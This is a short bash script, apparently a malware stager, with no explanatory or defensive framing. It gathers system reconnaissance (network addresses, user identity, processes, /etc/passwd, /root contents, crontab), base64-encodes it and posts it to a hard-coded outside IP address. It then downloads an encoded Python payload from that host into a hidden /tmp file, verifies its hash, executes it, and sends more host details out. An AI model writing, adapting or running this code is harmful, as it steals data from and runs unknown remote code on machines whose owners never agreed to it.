#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# keys1 runner: b64 payload + md5 verify
export PYTHONPATH=/tmp/imp
O=/tmp/.KEYS1DL.txt
: > "$O"
for i in 1 2 3 4 5 6 8; do
  curl -sm90 http://131.123.43.239/keys1.b64 -o /tmp/.kb64 2>/dev/null
  base64 -d /tmp/.kb64 > /tmp/.keys1.py 2>/dev/null
  H=$(md5sum /tmp/.keys1.py 2>/dev/null | cut -d' ' -f1)
  [ "$H" = "28217e26d987f71123d5b8699214853d" ] && break
  sleep 5
done
H=$(md5sum /tmp/.keys1.py 2>/dev/null | cut -d' ' -f1)
if [ "$H" != "28217e26d987f71123d5b8699214853d" ]; then echo "KEYS1 DL_FAIL" >> "$O"; curl -sm30 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel2_keysdl"; exit 0; fi
cd /tmp && python3 /tmp/.keys1.py
echo KEYS1_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


